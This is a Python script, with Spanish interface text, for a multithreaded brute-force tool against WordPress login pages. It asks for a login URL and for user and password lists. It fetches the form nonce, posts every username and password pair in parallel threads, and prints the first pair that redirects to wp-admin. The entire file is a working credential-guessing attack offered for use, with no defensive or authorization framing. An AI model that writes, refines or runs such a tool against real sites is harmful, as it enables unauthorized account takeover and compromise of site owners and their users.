from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools
import threading
import requests
import os
import sys
import signal
from tqdm import tqdm
from colorama import Fore, Style, init
from queue import Queue, Empty

init(autoreset=True)

BANNER = f"""
{Style.BRIGHT}{Fore.CYAN}
■▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀■
■ {Fore.WHITE}WORDPRESS BRUTE FORCE {Fore.CYAN}■
■▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄■
{Style.RESET_ALL}"""

BLOCK_SIZE = 5000
shutdown = False

def handle_sigint(signum, frame):
    global shutdown
    if not shutdown:
        shutdown = True
        print(f"\n{Fore.RED}[!]{Style.RESET_ALL} Escaneo cancelado")
        sys.exit(1)

signal.signal(signal.SIGINT, handle_sigint)

class InstantStopLoader:
    def __init__(self, source):
        self.source = source
        self.is_file = os.path.isfile(source)
        self.queue = Queue(maxsize=2)
        self.stop_flag = threading.Event()
        self.total_lines = 1
        self.loader_thread = None
        
        if self.is_file:
            self.total_lines = self._count_lines()
            self.loader_thread = threading.Thread(target=self._load_chunks, daemon=True)

    def _count_lines(self):
        with open(self.source, 'r', errors='ignore') as f:
            return sum(1 for _ in f)

    def _load_chunks(self):
        try:
            with open(self.source, 'r', errors='ignore') as f:
                while not self.stop_flag.is_set():
                    chunk = list(itertools.islice(f, BLOCK_SIZE))
                    if not chunk:
                        break
                    self.queue.put([line.strip() for line in chunk])
        finally:
            self.queue.put(None)

    def start(self):
        if self.is_file:
            self.loader_thread.start()

    def __iter__(self):
        if not self.is_file:
            yield self.source
            return
            
        while not self.stop_flag.is_set():
            try:
                chunk = self.queue.get(timeout=0.1)
                if chunk is None:
                    return
                yield from chunk
                self.queue.task_done()
            except Empty:
                if self.stop_flag.is_set():
                    return

    def stop(self):
        self.stop_flag.set()
        if self.is_file:
            while not self.queue.empty():
                self.queue.get()
                self.queue.task_done()

def brute_force(target_url):
    global shutdown
    shutdown = False

    print(BANNER)
    
    # Configuración interactiva
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}URL de login: ", end="")
    login_url = input().strip()
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}Usuario (archivo/texto): ", end="")
    user_input = input().strip()
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}Contraseñas (archivo/texto): ", end="")
    pass_input = input().strip()
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}Hilos [20]: ", end="")
    threads = int(input().strip() or "20")
    
    print(f"{Style.BRIGHT}{Fore.CYAN}↳ {Fore.WHITE}Timeout (s) [5]: ", end="")
    timeout = int(input().strip() or "5")

    # Inicializar cargadores
    users = InstantStopLoader(user_input)
    passwords = InstantStopLoader(pass_input)
    total_creds = users.total_lines * passwords.total_lines
    print(f"\n{Fore.CYAN}[i] Combinaciones totales: {Fore.WHITE}{total_creds:,}")

    # Iniciar carga
    users.start()
    passwords.start()

    # Configurar progreso
    progress = tqdm(
        total=total_creds,
        desc=f"{Fore.CYAN}⏳ Progreso{Style.RESET_ALL}",
        unit="creds",
        dynamic_ncols=True,
        position=1,
        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]",
        leave=False
    )

    # Sistema de parada unificado
    stop_controller = threading.Event()

    # Generador con parada instantánea
    def credential_generator():
        try:
            for user in users:
                if stop_controller.is_set(): break
                for pwd in passwords:
                    if stop_controller.is_set(): break
                    yield (user, pwd)
        finally:
            users.stop()
            passwords.stop()

    # Verificación ultra-rápida
    def check_login(user, password):
        if stop_controller.is_set():
            return None

        try:
            with requests.Session() as session:
                response = session.get(login_url, timeout=timeout)
                nonce_pos = response.text.find('name="_wpnonce" value="')
                nonce = response.text[nonce_pos+20:nonce_pos+30].split('"')[0] if nonce_pos != -1 else ""
                
                response = session.post(
                    login_url,
                    data=f"log={user}&pwd={password}&wp-submit=Log+In&testcookie=1&_wpnonce={nonce}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=timeout,
                    allow_redirects=False
                )
                
                if response.status_code == 302 and "wp-admin" in response.headers.get('Location', ''):
                    return (user, password)
        except Exception:
            pass
        finally:
            if not stop_controller.is_set():
                progress.update()
        return None

    # Ejecución principal con parada controlada
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            credentials = credential_generator()
            
            for user, pwd in credentials:
                if stop_controller.is_set():
                    break
                
                futures.append(executor.submit(check_login, user, pwd))
                
                if len(futures) >= threads:
                    for future in as_completed(futures):
                        if result := future.result():
                            stop_controller.set()
                            shutdown = True
                            progress.close()
                            print(f"\n\033[2K\033[1A{Fore.GREEN}✅ {Style.BRIGHT}Credenciales válidas: {Fore.WHITE}{result[0]}:{result[1]}{Style.RESET_ALL}")
                            executor.shutdown(wait=False, cancel_futures=True)
                            users.stop()
                            passwords.stop()
                            return
                    futures = []
            
            for future in as_completed(futures):
                if result := future.result():
                    stop_controller.set()
                    progress.close()
                    print(f"\n\033[2K\033[1A{Fore.GREEN}✅ {Style.BRIGHT}Credenciales válidas: {Fore.WHITE}{result[0]}:{result[1]}{Style.RESET_ALL}")
                    return

    except Exception as e:
        print(f"\n{Fore.RED}[ERROR]{Style.RESET_ALL} {str(e)}")
    finally:
        progress.close()
        stop_controller.set()
        users.stop()
        passwords.stop()

    print(f"\n{Fore.RED}❌ {Style.BRIGHT}No se encontraron credenciales válidas{Style.RESET_ALL}")